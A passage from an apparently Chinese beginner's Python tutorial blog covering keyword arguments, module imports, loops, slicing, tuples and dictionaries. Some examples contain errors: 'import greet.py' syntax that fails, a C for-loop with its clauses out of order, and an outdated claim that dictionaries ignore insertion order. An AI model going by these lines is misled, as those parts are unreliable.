class="string">&gt;&gt;&gt;Hello! adam</span></span><br><span class="line"><span class="string">Hello! ben</span></span><br><span class="line"><span class="string">Hello! jjg</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="传递任意数量的关键字实参"><a class="markdownIt-Anchor" href="#传递任意数量的关键字实参"></a> 传递任意数量的关键字实参</h3><p>有时候接收任意数量的实参，但是不知道传递给函数的是什么样的信息，这时候可以添加两个星号**表示接收任意数量的键值对。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_profile</span>(<span class="params">fname,lname,**user_info</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;创建一个字典储存关于用户的一切&#x27;&#x27;&#x27;</span></span><br><span class="line">    user_info[<span class="string">&#x27;fname&#x27;</span>]=fname</span><br><span class="line">    user_info[<span class="string">&#x27;lname&#x27;</span>]=lname</span><br><span class="line">    <span class="keyword">return</span> user_info</span><br><span class="line">user=build_profile(<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;ben&#x27;</span>,location=<span class="string">&#x27;guangzhou&#x27;</span>,sexual=<span class="string">&#x27;male&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(user)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;&#123;&#x27;location&#x27;: &#x27;guangzhou&#x27;, &#x27;sexual&#x27;: &#x27;male&#x27;, &#x27;fname&#x27;: &#x27;adam&#x27;, &#x27;lname&#x27;: &#x27;ben&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="将函数导入模块"><a class="markdownIt-Anchor" href="#将函数导入模块"></a> 将函数导入模块</h2><p>正如C语言通过包含头文件来引入已经定义好的函数体一样，Python中也可以将函数写好储存在<strong>模块</strong>中。在编写代码时，我们可以使用import语句将模块<strong>导入</strong>进主程序中。通过将函数储存在独立的文件，可以隐藏代码的细节，将重点放在程序的高层逻辑上，为代码添加新一层抽象（A new level of abstraction）。通过导入函数还可以使用其他程序员编写的语言库。</p><p>导入模块有许多种方式，下面进行简单的介绍。</p><h3 id="导入整个模块"><a class="markdownIt-Anchor" href="#导入整个模块"></a> 导入整个模块</h3><p><strong>模块</strong>是拓展名为.py的独立文件，该文件通常与主程序在同一个目录下，然后就可以通过import来导入模块。</p><p>比如一个文件名为greet.py的文件内容为：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello! &quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;I&#x27;m a test function&quot;</span>)</span><br></pre></td></tr></table></figure><p>在greet.py的相同目录下创建一个新的文件作为主程序，<a href="http://xn--main-uh5fx0bv5vuzal67bnopyv8e.py">我们给它命名为main.py</a>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> greet.py</span><br><span class="line"></span><br><span class="line">greet.greet(<span class="string">&#x27;ben&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello! ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>Python在读取import这一行时，会打开greet.py文件，并将其中所有的函数全部都复制到这个程序中，但是你看不到这些代码。你可以通过指定导入模块文件名和函数名称来使用模块中的函数，并用句点分隔。</p><h3 id="导入特定的函数"><a class="markdownIt-Anchor" href="#导入特定的函数"></a> 导入特定的函数</h3><p>有时候我们只需要导入模块中几个特定的函数而无须全部导入，只需要使用如下格式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> greet.py <span class="keyword">import</span> greet,test</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;ben&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello! ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>通过这种语法导入的函数无须使用句点分隔文件名和函数名，直接使用函数名就可以了，并且可以通过逗号引入任意数量的函数。</p><h3 id="使用as给函数指定别名"><a class="markdownIt-Anchor" href="#使用as给函数指定别名"></a> 使用as给函数指定别名</h3><p>有时候导入模块中的函数名和主程序中的函数名有冲突，或者函数名太长，可以用as给导入的函数指定<strong>别名</strong>。导入的格式如下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> greet <span class="keyword">import</span> greet <span class="keyword">as</span> JJG</span><br><span class="line"></span><br><span class="line">JJG(<span class="string">&#x27;ben&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello! ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="使用as给模块指定别名"><a class="markdownIt-Anchor" href="#使用as给模块指定别名"></a> 使用as给模块指定别名</h3><p>除了给函数指定别名，还可以给模块指定别名，语法如下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> greet <span class="keyword">as</span> g</span><br><span class="line"></span><br><span class="line">g.greet(<span class="string">&#x27;ben&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello! ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="导入模块中的所有函数"><a class="markdownIt-Anchor" href="#导入模块中的所有函数"></a> 导入模块中的所有函数</h3><p>使用星号*可以导入模块中的所有函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> greet <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;ben&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Hello! ben</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这样一来使用模块中的每一个函数都不需要加文件名和句点了，但是不推荐这么做，尤其是在编译大型程序时。因为这可能会导致模块中的函数名和主程序的函数名相冲突，进而引发意想不到的错误。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2062059095_p0.jpg" alt="复件 62059095_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始学Python（二）</title>
      <link href="/posts/e85694bd610a/"/>
      <url>/posts/e85694bd610a/</url>
      
        <content type="html"><![CDATA[<p>紧跟上文，这一篇主要讲了列表和字典，至此Python中基础的数据结构部分算是全部讲完了（撒花✿✿ヽ(°▽°)ノ✿）</p><hr /><h1 id="四-操作列表"><a class="markdownIt-Anchor" href="#四-操作列表"></a> 四、操作列表</h1><p>顾名思义，就是怎么<strong>遍历并处理</strong>列表元素，这里我们会用到for函数。</p><h2 id="for函数"><a class="markdownIt-Anchor" href="#for函数"></a> for函数</h2><p>我们先介绍在Python中for函数的用法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> example:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Adam</span></span><br><span class="line"><span class="string">Ben</span></span><br><span class="line"><span class="string">JJG</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里将一个临时变量 i 与列表example中的元素相绑定并遍历整个列表。需要注意的是Python中的for函数和c语言的for函数用法截然不同。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i++ ;i&lt;<span class="number">10</span>)<span class="comment">//定义并初始化临时变量i，定义循环操作，定义循环结束条件</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//执行操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而在C++中支持for函数的两种用法。</p><p>既然在Python中for函数能做到遍历整个列表，那我们能做的也还不仅于此，我们可以统一的对列表所有元素进行操作，以下就是一个简单的例子。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">games=[<span class="string">&#x27;to the moon&#x27;</span>,<span class="string">&#x27;finding paradise&#x27;</span>,<span class="string">&#x27;impostor factory&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> game <span class="keyword">in</span> games:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;I really love <span class="subst">&#123;game.title()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Kan Gao is really a genius&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;I really love To The Moon</span></span><br><span class="line"><span class="string">I really love Finding Paradise      </span></span><br><span class="line"><span class="string">I really love Impostor Factory      </span></span><br><span class="line"><span class="string">Kan Gao is really a genius</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>最后，Python是一门对缩进敏感的语言，在使用for循环时请务必注意缩进问题，否则很容易出现逻辑错误甚至语法错误。</p><h2 id="创建数值列表"><a class="markdownIt-Anchor" href="#创建数值列表"></a> 创建数值列表</h2><p>这里我们引入一个重要的函数，range函数。</p><p>range函数不难理解，一共可以向range传递三个参数，分别是起始值，结束值和步长。其中第三个参数是可选的，默认为1。需要注意的是range函数确定的范围实际上是一个左闭右开的区间，也就是说range(1,20)本身只包含1~19，20不被包含在内。</p><p>我们可以结合for函数和range函数进行许多操作，最简单的就是打印一串数字。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>我们还可以结合list函数和range函数创建数字列表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(number)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[1,2,3,4,5]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里创建了1~5的数字列表，但如果要输出一个前五个数字平方的列表呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    example.append(i**<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(example)</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[1,4,9,16,25]</span></span><br><span class="line"><span class="string">print(min(example))</span></span><br><span class="line"><span class="string">print(max(example))</span></span><br><span class="line"><span class="string">print(sum(example))</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;1</span></span><br><span class="line"><span class="string">25</span></span><br><span class="line"><span class="string">55</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>此外，我们还可以用min函数，max函数和sum函数对列表进行简单的统计计算，用法如上。</p><p>最后就是<strong>列表解析</strong>，可以让你精简你的代码，用法如下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num=[i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>)]</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;[1,4,9,16,25]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="使用列表的一部分"><a class="markdownIt-Anchor" href="#使用列表的一部分"></a> 使用列表的一部分</h2><p>在上一小节中，我们介绍了如何遍历整个列表并对其元素进行处理，这里我们只需要处理一部分列表元素。也就是<strong>切片</strong></p><p>现在我有一个列表，但是我只想打印他们前三个成员，那么我们就需要切片。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>,<span class="string">&#x27;Finding&#x27;</span>,<span class="string">&#x27;Paradise&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> example[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Adam</span></span><br><span class="line"><span class="string">Ben</span></span><br><span class="line"><span class="string">JJG</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>我们仔细分析切片是如何使用的。和range函数类似，我们可以向切片传递三个参数example[x:y:z]。其中x代表起始元素索引，y代表结束元素索引，z代表步长且默认为1，而范围同样是左闭右开。</p><p>与range函数不同的一点是，索引可以是负值。比如example[-3:]就代表从example倒数第三个元素到末尾元素。</p><h2 id="复制列表"><a class="markdownIt-Anchor" href="#复制列表"></a> 复制列表</h2><p>学习完切片后，我们有必要介绍如何用切片来复制列表。下面是演示。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eg1=[<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>,<span class="string">&#x27;JJG&#x27;</span>]</span><br><span class="line">eg2=[]</span><br><span class="line"><span class="comment">#正确的做法</span></span><br><span class="line">eg2=eg1[:]</span><br><span class="line"><span class="comment">#错误的做法</span></span><br><span class="line">eg2=eg1</span><br></pre></td></tr></table></figure><p>上面演示了两种复制列表的方法，但只有第一种是正确的。因为只有使用切片复制才能实实在在的产生第二个内容相同的列表，而第二种方法只是将eg2关联到eg1。这一点类似C语言中的指针，从而导致还是只有一个列表，不过是都指向一个地方而已。</p><h2 id="元组"><a class="markdownIt-Anchor" href="#元组"></a> 元组</h2><p>元组和列表类似，以圆括号()构造，同样可以使用索引访问元素。但是元组的元素不可修改。也就是说如果想要创建一个在整个数据周期内内容不变的数据结构，最好使用元组。</p><p>如果你尝试着像修改列表一样去修改元组的元素，那么编译器会报错。</p><p>但是如果你想要更改元组，可以通过重新给元组赋值来实现。下面演示一下元组的使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=(<span class="string">&#x27;Adam&#x27;</span>,<span class="string">&#x27;Ben&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(example[<span class="number">0</span>],example[<span class="number">1</span>])</span><br><span class="line">example=(<span class="string">&#x27;to the moon&#x27;</span>,<span class="string">&#x27;finding paradise&#x27;</span>)<span class="comment">#给元组重新赋值</span></span><br><span class="line"><span class="built_in">print</span>(example[<span class="number">0</span>].title(),example[<span class="number">1</span>].title())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Adam Ben</span></span><br><span class="line"><span class="string">To The Moon Finding Paradise</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="五-if语句"><a class="markdownIt-Anchor" href="#五-if语句"></a> 五、if语句</h1><p>if语句比较简单，大部分和C共享一套逻辑。这里只简单谈谈和C语言有所区别的地方。</p><p>①Python中判断多个条件的’与‘和’或‘为and和or，更符合口语。但是C语言中分别为&amp;&amp;和||。</p><p>②Python中有一个比较特殊的判断in和其否定not in，即判断元素在不在所给范围内。</p><p>③if语句和Python中的for语句一样对缩进敏感，使用格式大致相仿。</p><p>④Python中执行多个判断时使用的是elif，而C语言中使用的是else if。</p><p>没了，以上。（确实就这么简单）</p><h1 id="六-字典"><a class="markdownIt-Anchor" href="#六-字典"></a> 六、字典</h1><p>Python中的字典是一种储存着键值对的列表，类似于C语言的枚举。但是C语言的枚举仅限于字符串和整数的映射，而字典可以进行字符串到字符串的映射，甚至是字符串到列表。事实上，Python中的所有对象都可作为字典中的值，相当于C语言中的超大型#define。（？）</p><p>下面演示一下字典的定义和用法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;<span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(example[<span class="string">&#x27;fname&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;adam</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>字典中键与值之间用冒号’:‘连接，不同的键值对之间用逗号’,'连接。字典中可以加入任意多的键值对。</p><h2 id="字典的基本操作"><a class="markdownIt-Anchor" href="#字典的基本操作"></a> 字典的基本操作</h2><h3 id="添加键值对"><a class="markdownIt-Anchor" href="#添加键值对"></a> 添加键值对</h3><p>字典是一种动态结构，想要添加字典，需要依次指定字典名、用<strong>方括号</strong>括起的键、<strong>等号</strong>和对应的值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;<span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>&#125;</span><br><span class="line">example[<span class="string">&#x27;nick_name&#x27;</span>]=<span class="string">&#x27;JJG&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;&#123;&#x27;fname&#x27;: &#x27;adam&#x27;, &#x27;lname&#x27;: &#x27;ben&#x27;, &#x27;nick_name&#x27;: &#x27;JJG&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>用字典来储存用户编写的数据或者自动编写储存大量的键值对时，通常我们会先定义一个空字典。</p><h3 id="修改键值对"><a class="markdownIt-Anchor" href="#修改键值对"></a> 修改键值对</h3><p>与修改列表类似，修改字典即直接把新值赋给原有的键值对，当然如果不存在对应的键，其结果相当于添加了一个新键值对。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;<span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>&#125;</span><br><span class="line">example[<span class="string">&#x27;fname&#x27;</span>]=<span class="string">&#x27;JJG&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;&#123;&#x27;fname&#x27;: &#x27;JJG&#x27;, &#x27;lname&#x27;: &#x27;ben&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="删除键值对"><a class="markdownIt-Anchor" href="#删除键值对"></a> 删除键值对</h3><p>格式与之前的操作类似，通过使用del函数以及字典名和对应的键来删除键值对。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;<span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> example[<span class="string">&#x27;fname&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;&#123;&#x27;lname&#x27;: &#x27;ben&#x27;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意，一旦删除了键值对，那么该键值对就在字典里永久消失了。</p><h3 id="遍历字典"><a class="markdownIt-Anchor" href="#遍历字典"></a> 遍历字典</h3><p>使用for循环以及items方法来遍历字典中的键值对。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;</span><br><span class="line">    <span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;nname&#x27;</span>:<span class="string">&#x27;jjg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;game&#x27;</span>:<span class="string">&#x27;finding paradise&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> example.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Key is <span class="subst">&#123;key&#125;</span> and value is <span class="subst">&#123;value&#125;</span>.&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Key is fname and value is adam.</span></span><br><span class="line"><span class="string">Key is lname and value is ben.</span></span><br><span class="line"><span class="string">Key is nname and value is jjg.</span></span><br><span class="line"><span class="string">Key is game and value is finding paradise.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>items方法返回一个键值对列表，然后for再把键值对的值依次分配给两个值key和value。</p><h4 id="遍历所有的键"><a class="markdownIt-Anchor" href="#遍历所有的键"></a> 遍历所有的键</h4><p>当然，你也可以选择只<strong>遍历所有的键</strong>，将方法items改为keys就可以了，不过遍历字典时会默认遍历所有的键，也就是说加不加keys方法所输出的结果都一样。但是显式的使用keys，可以提高你的代码可读性。</p><p>同样的，keys也和items一样，返回的是一个列表，前者只返回字典中所有键的值，而后者则是返回字典中所有的键值对。</p><p>值得注意的是Python并不关心你输入字典时的顺序，换而言之Python的字典排序并不是按照你输入的顺序排序的，如果你想要对输出的字典键值对排序，你需要调用sorted函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;</span><br><span class="line">    <span class="string">&#x27;fname&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lname&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;nname&#x27;</span>:<span class="string">&#x27;jjg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;game&#x27;</span>:<span class="string">&#x27;finding paradise&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">sorted</span>(example.keys()):</span><br><span class="line">    <span class="built_in">print</span>(name.title()+<span class="string">&quot;, is very good!&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Fname, is very good!</span></span><br><span class="line"><span class="string">Game, is very good!</span></span><br><span class="line"><span class="string">Lname, is very good!</span></span><br><span class="line"><span class="string">Nname, is very good!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="遍历所有的值"><a class="markdownIt-Anchor" href="#遍历所有的值"></a> 遍历所有的值</h4><p>除了遍历所有的键之外，你当然还可以<strong>遍历所有的值</strong>，通过调用values方法即可，用法同keys与items。</p><p>值得一提的是，当处理包含大量键值对的字典时，字典的值很有可能会有重复数据，但是使用values输出的值是不考虑重复的。如果你需要去除掉结果中重复的数据，你可以使用set<strong>集合</strong>。集合类似于列表，但每个元素都是独一无二的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;</span><br><span class="line">    <span class="string">&#x27;name1&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name2&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name3&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name4&#x27;</span>:<span class="string">&#x27;jjg&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">set</span>(example.values()):</span><br><span class="line">    <span class="built_in">print</span>(value.title())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Ben</span></span><br><span class="line"><span class="string">Jjg</span></span><br><span class="line"><span class="string">Adam</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="使用get方法来访问值"><a class="markdownIt-Anchor" href="#使用get方法来访问值"></a> 使用get方法来访问值</h3><p>一般情况下，我们都是用方括号来访问字典中的值，但是如果方括号内的键名不存在，会在Python中引发键值错误（KeyError）</p><p>如果想避免发生这种错误，那么就使用get方法指定要访问的键名和键名不存在时的返回值。前者是必选的，而后者不存在时默认返回值为None。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example=&#123;</span><br><span class="line">    <span class="string">&#x27;name1&#x27;</span>:<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name2&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name3&#x27;</span>:<span class="string">&#x27;ben&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name4&#x27;</span>:<span class="string">&#x27;jjg&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">value=example.get(<span class="string">&#x27;fname&#x27;</span>,<span class="string">&#x27;No value assigned&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(value)</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;No value assigned</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="嵌套"><a class="markdownIt-Anchor" href="#嵌套"></a> 嵌套</h2><p>有时候，需要将一系列字典存储在列表中，或将列表作为值存储在字典中，这称为<strong>嵌套</strong>。你可以在列表中嵌套字典、在字典中嵌套列表甚至在字典中嵌套字典。</p><h3 id="字典列表列表储存字典"><a class="markdownIt-Anchor" href="#字典列表列表储存字典"></a> 字典列表/列表储存字典</h3><p>顾名思义，就是创建一个列表，列表元素为字典。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建一个空列表</span></span><br><span class="line">student=[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建30个学生</span></span><br><span class="line"><span class="keyword">for</span> student_number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    new_student=&#123;</span><br><span class="line">        <span class="string">&#x27;age&#x27;</span>:<span class="number">19</span>,</span><br><span class="line">        <span class="string">&#x27;school&#x27;</span>:<span class="string">&#x27;JUN&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sexual&#x27;</span>:<span class="string">&#x27;male&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    student.append(new_student)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#显示前五个学生</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> student[:<span class="number">5</span>]:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;&#123;&#x27;age&#x27;: 19, &#x27;school&#x27;: &#x27;JUN&#x27;, &#x27;sexual&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line"><span class="string">&#123;&#x27;age&#x27;: 19, &#x27;school&#x27;: &#x27;JUN&#x27;, &#x27;sexual&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line"><span class="string">&#123;&#x27;age&#x27;: 19, &#x27;school&#x27;: &#x27;JUN&#x27;, &#x27;sexual&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line"><span class="string">&#123;&#x27;age&#x27;: 19, &#x27;school&#x27;: &#x27;JUN&#x27;, &#x27;sexual&#x27;: &#x27;male&#x27;&#125;</span></span><br><span class="line"><span class="string">&#123;&#x27;age&#x27;: 19, &#x27;school&#x27;: 